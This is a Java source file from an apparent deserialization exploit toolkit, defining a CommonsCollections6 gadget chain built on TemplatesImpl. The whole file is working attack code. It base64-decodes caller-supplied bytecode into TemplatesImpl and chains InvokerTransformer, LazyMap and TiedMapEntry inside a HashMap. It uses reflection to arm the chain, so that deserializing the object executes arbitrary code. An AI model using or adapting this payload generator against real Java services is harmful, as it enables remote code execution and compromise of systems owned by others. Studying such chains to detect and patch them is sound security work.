package com.chave.gadget.chain;

import com.chave.utils.Util;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Field;
import java.util.HashMap;

public class CommonsCollections6_TemplatesImpl {

    // 传入payload {"类名", "字节码/命令"}
    public static Object getObject(String[] payload) throws NoSuchFieldException, IllegalAccessException {
        byte[][] code = {Util.base64ToByteCode(payload[1])};

        TemplatesImpl templates = new TemplatesImpl();
        Class<TemplatesImpl> templatesClass = TemplatesImpl.class;
        Field _nameField = templatesClass.getDeclaredField("_name");
        Field _bytecodesField = templatesClass.getDeclaredField("_bytecodes");

        _nameField.setAccessible(true);
        _bytecodesField.setAccessible(true);
        _nameField.set(templates, "1");
        _bytecodesField.set(templates, code);

        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", null, null);

        LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(), invokerTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(new HashMap(), "1");
        tiedMapEntry.hashCode();

        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry, null);

        Field mapField = TiedMapEntry.class.getDeclaredField("map");
        mapField.setAccessible(true);
        mapField.set(tiedMapEntry, lazyMap);

        return hashMap;
    }
}
